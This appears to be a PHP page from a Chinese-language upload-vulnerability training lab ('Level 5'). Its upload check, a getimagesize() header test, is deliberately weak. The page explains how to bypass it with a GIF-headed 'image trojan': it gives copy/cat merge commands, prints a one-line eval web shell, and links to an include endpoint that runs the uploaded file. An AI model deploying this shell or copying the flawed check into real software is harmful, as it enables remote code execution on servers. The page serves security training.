<?php
/**
 * Level 5: 文件内容检测
 * 难度: ★★☆☆☆
 * 描述: 使用getimagesize()检测图片文件头
 * 绕过: 制作图片马(添加GIF文件头)
 */

$upload_dir = 'uploads/';
if (!file_exists($upload_dir)) mkdir($upload_dir, 0777, true);

$message = '';
$upload_file = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];
    $ext = strtolower(strrchr($filename, '.'));

    $whitelist = array('.jpg', '.jpeg', '.png', '.gif');

    if (!in_array($ext, $whitelist, true)) {
        $message = '<div class="error">❌ 只允许上传图片文件!</div>';
    } else {
        // 检查文件头
        $image_info = getimagesize($tmp_name);
        if ($image_info === false) {
            $message = '<div class="error">❌ 不是有效的图片文件!</div>';
        } else {
            if (move_uploaded_file($tmp_name, $upload_dir . $filename)) {
                $message = '<div class="success">✅ 文件上传成功!</div>';
                $upload_file = $upload_dir . $filename;
            } else {
                $message = '<div class="error">❌ 文件上传失败!</div>';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 5 - 文件内容检测</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .upload-form {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
        }
        .file-input { margin: 20px 0; }
        input[type="file"] {
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 5px;
            background: white;
        }
        input[type="submit"] {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #5568d3; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 5 - 文件内容检测(图片马)</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 绕过方法: 制作图片马</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>白名单验证 + 文件头检测(getimagesize)</li>
                    <li>必须是真实的图片文件才能通过</li>
                    <li>需要制作图片马:在图片中嵌入PHP代码</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>💡 绕过方法 - 制作GIF图片马</h3>
                <p><strong>方法1: 手动添加GIF文件头(最简单)</strong></p>
                <ol>
                    <li>创建文件shell.gif</li>
                    <li>第一行写入: <code>GIF89a</code></li>
                    <li>第二行写入: <code>&lt;?php phpinfo(); ?&gt;</code></li>
                    <li>保存并上传该文件</li>
                    <li>访问 shells/include.php?file=../uploads/shell.gif 来执行PHP代码</li>
                </ol>
                <p><strong>方法2: 使用copy命令合并(Windows)</strong></p>
                <div class="code-box">copy 正常图片.jpg /b + shell.php /a 图片马.jpg</div>
                <p><strong>方法3: 使用cat命令合并(Linux)</strong></p>
                <div class="code-box">cat 正常图片.jpg shell.php > 图片马.jpg</div>
            </div>

            <?php echo $message; ?>

            <?php if ($upload_file): ?>
            <div class="success">
                文件路径: <a href="<?php echo htmlspecialchars($upload_file); ?>" target="_blank" style="color: #155724; font-weight: bold;">
                    <?php echo htmlspecialchars($upload_file); ?>
                </a>
                <br><br>
                <strong>下一步:</strong>
                <ul style="margin-left: 20px; margin-top: 5px;">
                    <li>图片已上传,但直接访问不会执行PHP代码</li>
                    <li>需要通过文件包含漏洞访问: <a href="shells/include.php?file=../<?php echo htmlspecialchars($upload_file); ?>" target="_blank" style="color: #155724;">点击这里执行</a></li>
                    <li>或者参考shells目录下的示例</li>
                </ul>
            </div>
            <?php endif; ?>

            <div class="upload-form">
                <h3>上传文件</h3>
                <form method="post" enctype="multipart/form-data">
                    <div class="file-input">
                        <input type="file" name="uploadfile" required />
                    </div>
                    <input type="submit" value="上传文件" />
                </form>
            </div>

            <div class="hint">
                <strong>🔍 防护代码:</strong>
                <div class="code-box">// 检查文件头
$image_info = getimagesize($tmp_name);
if ($image_info === false) {
    die("不是有效的图片文件!");
}</div>
                <p><strong>图片马shell.gif内容示例:</strong></p>
                <div class="code-box">GIF89a
&lt;?php @eval($_POST['cmd']); ?&gt;</div>
                <p style="margin-top:10px;">这个文件能通过getimagesize()检查,因为有GIF文件头GIF89a。</p>
                <p><strong>如何利用:</strong> 图片马上传后不会直接执行,需要配合文件包含漏洞。本靶场在shells目录提供了文件包含示例。</p>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a>
        </div>
    </div>
</body>
</html>
